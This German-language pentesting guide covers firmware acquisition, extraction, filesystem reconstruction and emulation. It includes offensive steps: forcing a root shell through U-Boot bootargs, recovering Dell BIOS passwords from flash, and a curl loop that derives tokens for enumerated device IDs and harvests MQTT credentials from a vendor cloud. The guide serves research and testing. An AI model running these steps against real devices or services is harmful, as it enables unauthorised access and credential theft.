# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Informationen zur Erfassung über zugängliche Hardware-Schnittstellen finden Sie unter [Firmware-Dumping mit UART-Konsolenunterstützung](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Eine wiederholbare UART-Erfassung während des Bootvorgangs vor dem Zugriff auf die Konsole finden Sie unter [Stromversorgung und Oszilloskop-Erfassung mit SCPI steuern](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist unverzichtbare Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und unterstützt, mit der Benutzer interagieren. Sie wird in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem startet. Die Untersuchung und mögliche Modifizierung der Firmware ist ein entscheidender Schritt beim Ermitteln von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein wichtiger erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dabei werden Daten zu Folgendem erfasst:

- CPU-Architektur und Betriebssystem
- Einzelheiten zum Bootloader
- Hardware-Layout und Datenblätter
- Metriken zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verlauf und behördliche Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und erkannte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence- (OSINT-)Tools** äußerst wertvoll. Ebenso wichtig ist die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- Mit **Google-dork**-Abfragen gehostete Firmware-Dateien finden
- Direkt auf **Cloud-Speicher** zugreifen, beispielsweise mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mit Man-in-the-Middle-Techniken abfangen
- Firmware über Verbindungen wie **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) oder **PICit** aus dem Gerät **extrahieren**
- In der Gerätekommunikation nach Update-Anfragen **schnüffeln**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Firmware aus dem Bootloader oder über das Netzwerk **dumpen**
- Wenn alle anderen Möglichkeiten scheitern, den Speicherchip **entfernen und auslesen** und dafür geeignete Hardware-Tools verwenden

### Nur UART-Logs: Über die U-Boot-Umgebungsvariablen im Flash eine Root-Shell erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du trotzdem eine Init-Shell erzwingen, indem du **das U-Boot-Umgebungs-Blob** offline bearbeitest:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer (3,3 V) dumpen:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Lokalisieren Sie die U-Boot-env-Partition, bearbeiten Sie `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechnen Sie die U-Boot-env-CRC32 für das Blob neu**.
3. Flashen Sie nur die env-Partition erneut und starten Sie das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, die env-Partition jedoch über externen Flash-Zugriff beschreibbar ist.

## Analysieren der Firmware

Nachdem Sie nun **über die Firmware verfügen**, müssen Sie Informationen darüber extrahieren, um zu wissen, wie Sie damit umgehen sollen. Dafür können Sie verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **Dateien extrahieren, die in der Firmware eingebettet sind**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder du kannst die Datei mit [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) untersuchen.

### Rohe Display-Assets im externen Flash

Ein externer SPI-Dump enthält nicht unbedingt die ausführbare Firmware des MCU. Vergleiche bei einem Cortex-M-Ziel die Anfänge der infrage kommenden Codebereiche mit dem Speicherplan des Geräts: Eine normale Vektortabelle beginnt mit einem plausiblen SRAM-Stackpointer und einer Adresse des Reset-Handlers im ausführbaren Speicher. Eine fehlende Vektortabelle bei Offset null beweist für sich genommen nicht, dass der gesamte Chip keinen Code enthält. Untersuche weitere Offsets und den Boot-Ablauf. Wenn `binwalk` keinen Container findet, untersuche die Rohdaten und korreliere die Flash-Leseadressen aus einer [dekodierten SPI-Aufzeichnung](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) mit Aktionen, durch die neue Bildschirme geladen werden.<sup>[[14]](#references)</sup>

Versuche es bei einem Display-Asset-Bereich mit verschiedenen Pixel-Formaten und Abmessungen, statt PNG/JPEG vorauszusetzen. Das zitierte Gerät verwendete Frames im Format **80×160 RGB565 little-endian**: Bei zwei Bytes pro Pixel ist ein Frame **25,600 Bytes** (25 KiB) groß, nicht 24 Kilobit. Eine dekodierte Flash-Leseadresse identifizierte den Offset des Bildschirm-Assets. Der Forscher konvertierte ein vorbereitetes Bild mit `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, ersetzte das gleich große Asset im ursprünglichen Dump, schrieb ihn mit `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` und bestätigte das neue Bild auf dem Display. Dies demonstriert beschreibbare *externe Display-Assets*, nicht das Auslesen oder erneute Flashen der internen Firmware des MCU. Bewahre den ursprünglichen Dump auf und überprüfe vor jedem Schreibvorgang die Abmessungen, Byte-Reihenfolge, den Offset und die Länge des Ersatzes.<sup>[[14]](#references)</sup>

### Differentielle Flash-Analyse und wiederherstellbare XOR-Geheimnis-Speicher

Wenn für eine Firmware-Einstellung kein dokumentiertes Speicherformat vorliegt, lies zunächst mehrmals den Flash aus, ändere **genau eine** Einstellung, lies dann den gesamten Chip erneut aus und vergleiche die Offsets. Wiederhole das Experiment mit kontrollierten Werten, um die Einstellung von Zählern und Schreibmetadaten zu unterscheiden. Änderungen an neuen Offsets statt direkt an Ort und Stelle weisen auf einen append-only oder log-structured Speicher hin. Bewahre gelöschte bzw. als gelöscht markierte Einträge auf, da ihre Nutzdatenbytes möglicherweise wiederhergestellt werden können.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nachdem Sie die Region lokalisiert haben, extrahieren Sie die Firmware-Module mit Tools wie `binwalk` und analysieren Sie Writer und Validator mit Ghidra zurück. Bestätigen Sie Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung anhand des Codes, statt das Verfahren nur aus Chiffretextmustern abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Zero-Padding wiederherstellen

Wie unter [XOR-basierte Verschlüsselung](../../crypto/symmetric/#xor-based-encryption) beschrieben, legt Klartext bekannte Keystream-Bytes an denselben Offsets offen. Ein Feld fester Größe ist besonders gefährdet, wenn sich sein Zero-Padding über alle Indizes eines sich wiederholenden XOR-Schlüssels erstreckt: Das verschlüsselte Padding legt diese Schlüsselbytes direkt offen, da `0x00 XOR key_byte = key_byte`. Wenn alle Schlüsselindizes abgedeckt sind, rekonstruieren Sie den Schlüssel aus dem Chiffretext am Ende des Felds und entschlüsseln Sie die ausgefüllten Bytes.<sup>[[12]](#references)</sup>

Dells angreifbares DVAR-BIOS-Passwortformat ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Felds liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12`, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne brute force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysiere nicht jeden Datensatz unabhängig. Der DVAR-Schlüssel wird ungefähr wie folgt abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`: Der Device-Seed und die GUID sind festgelegt, und die einzige passwortabhängige Eingabe ist das erste Klartext-Byte. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppiere aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann den vollständigen Schlüssel durch Padding leaken und damit einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding nicht ausreicht. Eine Passwortrotation kann die Offenlegung daher verstärken, wenn alte Chiffretexte tombstoned statt gelöscht werden.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann rohe gespeicherte Schlüssel-Bytes anzeigen. Erstelle es aus einem Checkout und durchsuche wie folgt ein verifiziertes Flash-Image:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Für benutzerdefinierte Parser lassen sich Fehlalarme anhand der Datensatzstruktur, Anforderungen an druckbare Zeichen, Prüfungen auf Null-Padding, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels zurückweisen. Zeigen wiederholte Dumps wenige Bit-Flips pro Schreibvorgang, sollten die beobachteten Masken aufgelistet und mögliche Korrekturen anhand dieser Kriterien eingestuft werden. Mehrdeutige Zeichen sollten jedoch als solche gekennzeichnet werden, statt heuristische Ergebnisse als exakte Wiederherstellung auszugeben.<sup>[[12]](#references)</sup>

Passwortverifizierer sollten statt umkehrbarem Ciphertext einen gesalzenen, iterierten Einweg-Hash speichern. Logstrukturierte Speicher sollten außerdem ersetztes geheimes Material sicher entfernen.<sup>[[12]](#references)</sup>

### Dateisystem extrahieren

Mit den zuvor erwähnten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben können.\
Binwalk extrahiert es üblicherweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Das ist in der Regel einer der folgenden: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält die Signaturdatenbank von binwalk **nicht die Magic Bytes des Dateisystems**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem aus der Binärdatei herauszuschneiden**. **Extrahiere** das Dateisystem anschließend anhand der folgenden Schritte manuell entsprechend seinem Typ.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führe den folgenden **dd command** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstruktion aufgeteilter eingebetteter Root-Dateisysteme

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets jedoch über die nominale Partition hinausgehen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Gerät mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen, sodass das Auslesen einer einzelnen GPT-Partition nur das erste Segment liefert.<sup>[[9]](#references)</sup>

#### Vollständiges Medienabbild untersuchen

Überprüfen Sie zunächst, ob die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Schreibprozess das Abbild mehr geöffnet hat. Wenn der Dateiname eine Start-/Endadresse enthält, vergleichen Sie diesen Bereich mit der tatsächlichen Byte-Anzahl. Stellen Sie die GPT im schreibgeschützten Modus wieder her und hängen Sie nur den erforderlichen Bereich ein. Führen Sie **nicht** `vgchange -ay` auf einem nicht vertrauenswürdigen physischen Volume auf der Workstation aus, da es zu Konflikten zwischen Volume Groups und unbeabsichtigten Schreibvorgängen kommen kann.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwenden Sie eine Wegwerf-VM, wenn die ursprüngliche init-Logik oder ein LVM-Stack das gesamte Image sehen muss. Historische Boot-Logs einer standardmäßigen Boot-Partition sind besonders nützlich: Der Bootloader hat möglicherweise Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Verwenden Sie diese Werte, um eine eingebettete Befehlszeile, einen Kernel und ein initramfs herauszulösen. Überprüfen Sie anschließend jede Ausgabe unabhängig mit `file`, Magic Bytes und `binwalk`; das Lesen bis zum Ende des Containers kann versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel anhängen.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung zur Bootzeit wiederherstellen

Extrahieren Sie das initramfs des Kernels und reverse-engineeren Sie dessen `/init` sowie etwaige Speicherbibliotheken. Folgen Sie in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen für `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade; verfolgen Sie dann den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte in radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das linear-Target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen eines oder mehrerer zugrunde liegender Geräte zu. Eine wiederhergestellte Tabelle mit zwei Segmenten hat häufig folgende Form (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduziere die Maschinenarithmetik exakt, einschließlich Integer-Breite, Shifts und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Byte-Größe zunächst auf eine 4-KiB-Grenze ab und rechnet sie erst danach in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich das ausgewählte Ende um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruiere ein flaches Analyse-Image, indem du die Bereiche in Tabellenreihenfolge mit begrenzten Chunks kopierst, statt den vollständigen Media-Dump in den Arbeitsspeicher zu laden. So werden auch Mapper-Geräte auf dem Host vermieden. Halte die aus der GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge als separate Assertions fest.<sup>[[9]](#references)</sup>

#### Beschädigung von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS die `hsqs`-Magic und dekodiere das little-endian 64-Bit-Feld `bytes_used` an Superblock-Offset 40, bevor du `unsquashfs` ausführst. Wenn die Extraktion bei mehreren unabhängigen Strukturen fehlschlägt, durchsuche ein breites Fenster um die erwarteten Positionen und verlange aussagekräftige strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen mit der Anzahl der Inodes übereinstimmenden Root-Inode oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dieselbe vorzeichenbehaftete Differenz unabhängige Strukturen gültig macht – zum Beispiel Verzeichnis-Metadaten und einen verity-Datensatz –, liegt die wahrscheinliche Ursache in einem systematischen Fehler beim Segmentstart und nicht in fehlenden Bytes. Kehre zur umgekehrten Berechnung zurück und suche nach verworfenen Resten, Vorzeichenbehandlung, Überläufen oder Sektor-/Seitenausrichtung, bevor du versuchst, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halte schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist. Und das Booten eines modifizierten SquashFS über ein ausschließlich für Forschungszwecke vorgesehenes Init, das die verity-Prüfung auslässt, fälscht weder dessen Signatur noch hebelt es dm-verity aus.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu untersuchen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dazu werden verschiedene Tools verwendet, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Tools zur ersten Analyse

Für die erste Untersuchung der Binärdatei (hier als `<bin>` bezeichnet) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu identifizieren, Zeichenketten zu extrahieren, Binärdaten zu analysieren sowie Details zu Partitionen und Dateisystemen zu verstehen:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf eine mögliche Verschlüsselung oder Komprimierung hindeutet.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem in der Regel extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend der `dd`-Befehl verwendet, um das Dateisystem auszuschneiden:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert ist, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien zur Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzuspüren:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für eine umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl der im Dateisystem gefundene Quellcode als auch die kompilierten Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu erkennen, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens abrufen

Viele IoT-Hubs laden ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse findest du möglicherweise heraus, dass `<token>` lokal anhand der Geräte-ID und eines fest codierten geheimen Schlüssels abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als hexadezimale Zeichenfolge in Großbuchstaben dargestellt

Dieses Design ermöglicht es jeder Person, die eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen. Dabei werden häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt.

Praktischer Ablauf:

1) deviceId aus den UART-Boot-Logs extrahieren

- Einen 3.3V-UART-Adapter (TX/RX/GND) anschließen und die Logs aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware extrahieren

- Lade Binaries in Ghidra/radare2 und suche nach dem Config-Pfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten abgreifen

- URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Secrets zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Missbrauche unverschlüsseltes MQTT und schwache Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um Wartungs-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs aufzählen (in großem Umfang, mit Genehmigung)

- Viele Ökosysteme verwenden Bytes für Vendor-OUI/Produkt/Typ, gefolgt von einem sequenziellen Suffix.
- Du kannst Kandidaten-IDs durchlaufen, Tokens ableiten und Konfigurationen programmatisch abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine Mass Enumeration durchführst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann aufgrund von Hardware- oder Architekturabhängigkeiten auf Herausforderungen stoßen. Die Übertragung des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für die MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationswerkzeuge zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binaries wäre `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binaries läuft der Prozess ähnlich ab; zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion geteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, aber Inode-, Verzeichnis- oder Fragmenttabellen-Offsets unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Analysiere stattdessen das frühe Boot-Binary zurück und rekonstruiere den Blockgerätegraphen, den es erstellt: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem aber mit einem `dm-linear`-Mapping aufbauen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, selbst wenn alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Übernimm die Arithmetik der Firmware exakt. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Shifts und Abschneidungen in ihrer ursprünglichen Reihenfolge nach; und berücksichtige bei A/B-Layouts bankabhängige Endbereiche. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zuerst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst dann in 512-Byte-Sektoren an; ersetzt man diesen Ausdruck durch `partition_bytes // 512`, kann sich der angehängte Bereich um einige Kilobyte verschieben und alle nachgelagerten SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

